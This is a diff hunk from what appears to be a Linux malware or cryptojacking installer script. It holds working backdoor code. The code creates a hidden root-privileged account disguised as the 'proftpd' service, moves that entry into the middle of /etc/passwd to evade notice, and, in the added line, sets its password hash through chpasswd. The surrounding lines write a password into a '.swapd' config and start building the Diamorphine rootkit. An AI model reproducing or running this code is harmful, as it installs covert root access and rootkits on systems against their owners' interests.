@@ -602,6 +602,7 @@ sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 
 useradd -u 0 -G root,sudo -M -o -s /bin/bash -p '$1$0wbU4DjO$BL2pi3uHYUaoVOJSO7S171' proftpd
 awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; middle = int(NR/2); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<NR; i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
+sudo echo "proftpd:'$1$0wbU4DjO$BL2pi3uHYUaoVOJSO7S171'" | sudo chpasswd -e
 
 echo "[*] make toolZ, Diamorphine"
 cd /tmp
